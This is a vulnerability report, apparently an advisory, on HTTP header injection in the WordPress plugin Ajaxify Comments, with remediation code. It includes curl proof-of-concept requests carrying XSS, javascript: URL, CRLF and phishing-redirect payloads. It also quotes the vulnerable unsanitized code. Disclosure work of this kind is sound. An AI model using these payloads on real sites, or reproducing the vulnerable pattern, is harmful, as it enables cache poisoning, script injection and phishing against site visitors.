# Vulnerability Report: HTTP Header Injection in Ajaxify Comments Summary Field Value

## Overview

| Field | Value |
|-------|-------|
| **Plugin Name** | Ajaxify Comments - Ajax and Lazy Loading Comments |
| **Vendor** | DLX Plugins |
| **Affected Version** | ≤ 3.1.2 |
| **Vulnerability Type** | HTTP Header Injection |
| **OWASP Category** | A03:2021 – Injection |
| **CWE ID** | CWE-113 (HTTP Response Splitting) |
| **CVSS v3.1 Score** | 5.3 (Medium) |
| **Authentication** | None Required |
| **User Interaction** | None |

## Vulnerability Description

The Ajaxify Comments plugin for WordPress contains an HTTP Header Injection vulnerability in the `wpac_init()` function. User-supplied input from GET parameters `WPACUnapproved` and `WPACUrl` is directly passed to PHP's `header()` function without any sanitization or validation.

This allows unauthenticated attackers to inject arbitrary content into HTTP response headers, potentially leading to:

- Cache poisoning attacks
- Cross-site scripting (if headers are processed by client-side code)
- Session fixation (on older PHP versions)
- HTTP Response Splitting (on PHP < 7.1.25)

## Affected Code

**File:** `functions.php`  
**Lines:** 411-417  
**Function:** `wpac_init()`

```php
function wpac_init() {
    if ( isset( $_GET['WPACUnapproved'] ) ) {
        header( 'X-WPAC-UNAPPROVED: ' . $_GET['WPACUnapproved'] );
    }
    if ( isset( $_GET['WPACUrl'] ) ) {
        header( 'X-WPAC-URL: ' . $_GET['WPACUrl'] );
    }
    // ...
}
add_action( 'init', 'wpac_init' );
```

## Proof of Concept

### Test 1: Basic Header Injection

```bash
curl -I "http://localhost:8000/?WPACUnapproved=INJECTED_VALUE"
```

**Response:**
```http
HTTP/1.1 200 OK
X-WPAC-UNAPPROVED: INJECTED_VALUE
```

### Test 2: XSS Payload in Header

```bash
curl -I "http://localhost:8000/?WPACUnapproved=<script>alert(1)</script>"
```

**Response:**
```http
HTTP/1.1 200 OK
X-WPAC-UNAPPROVED: <script>alert(1)</script>
```

### Test 3: Malicious URL Injection

```bash
curl -I "http://localhost:8000/?WPACUrl=javascript:alert(1)"
```

**Response:**
```http
HTTP/1.1 200 OK
X-WPAC-URL: javascript:alert(1)
```

### Test 4: Combined Attack

```bash
curl -I "http://localhost:8000/?WPACUnapproved=1&WPACUrl=http://attacker.com/phish"
```

**Response:**
```http
HTTP/1.1 200 OK
X-WPAC-UNAPPROVED: 1
X-WPAC-URL: http://attacker.com/phish
```

### Test 5: CRLF Injection Attempt

```bash
curl -I "http://localhost:8000/?WPACUnapproved=test%0d%0aX-Injected:%20malicious"
```

**Response:**
```http
HTTP/1.1 200 OK
(No X-WPAC header - blocked by PHP 7.4+)
```

**Note:** CRLF injection is mitigated by modern PHP versions (7.1.25+), but older versions may be vulnerable.

### Test 6: Long Payload (500 characters)

```bash
curl -I "http://localhost:8000/?WPACUnapproved=$(python3 -c 'print("A"*500)')"
```

**Response:**
```http
HTTP/1.1 200 OK
X-WPAC-UNAPPROVED: AAAAAAAAAA... (500 characters accepted)
```

**Impact:** No length validation - potential for header buffer issues.

### Test 7: HTML Injection

```bash
curl -I "http://localhost:8000/?WPACUnapproved=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
```

**Response:**
```http
HTTP/1.1 200 OK
X-WPAC-UNAPPROVED: <img src=x onerror=alert(1)>
```

## Attack Scenarios

### Scenario 1: Cache Poisoning

1. Attacker visits: `http://localhost:8000/blog/?WPACUrl=http://evil.com`
2. CDN/proxy caches response with malicious header
3. If frontend JavaScript reads `X-WPAC-URL` header for redirects, all users get redirected

### Scenario 2: XSS via Header Processing

If any client-side code or browser extension reads custom headers:

```javascript
// If site has code like this:
fetch(url).then(r => {
    const wpacUrl = r.headers.get('X-WPAC-URL');
    window.location = wpacUrl; // Attacker controls redirect
});
```

### Scenario 3: Log Injection

Injected headers may appear in server logs, potentially exploiting log viewers:

```
?WPACUnapproved=<script>alert(document.cookie)</script>
```

## Impact Assessment

| Impact Type | Description |
|-------------|-------------|
| **Confidentiality** | Low - Headers could leak to logs or caches |
| **Integrity** | Medium - Attacker can manipulate HTTP responses |
| **Availability** | Low - Could cause cache issues |

**CVSS v3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` = **5.3 (Medium)**

## Remediation

### Recommended Fix

```php
function wpac_init() {
    if ( isset( $_GET['WPACUnapproved'] ) ) {
        // Sanitize: remove newlines, validate as integer (0 or 1)
        $value = absint( $_GET['WPACUnapproved'] );
        header( 'X-WPAC-UNAPPROVED: ' . $value );
    }
    
    if ( isset( $_GET['WPACUrl'] ) ) {
        // Sanitize: validate URL, remove newlines
        $url = esc_url_raw( $_GET['WPACUrl'] );
        $url = preg_replace( '/[\r\n]/', '', $url );
        
        if ( wp_http_validate_url( $url ) ) {
            header( 'X-WPAC-URL: ' . $url );
        }
    }
    // ...
}
```

### Key Fixes:

1. Use `absint()` for `WPACUnapproved` (it should only be 0 or 1)
2. Use `esc_url_raw()` for URL validation
3. Strip CRLF characters explicitly for defense-in-depth
4. Validate URL against allowlist if possible

## References

- [CWE-113: HTTP Response Splitting](https://cwe.mitre.org/data/definitions/113.html)
- [OWASP A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [PHP header() Security](https://www.php.net/manual/en/function.header.php)
- [WordPress esc_url_raw()](https://developer.wordpress.org/reference/functions/esc_url_raw/)

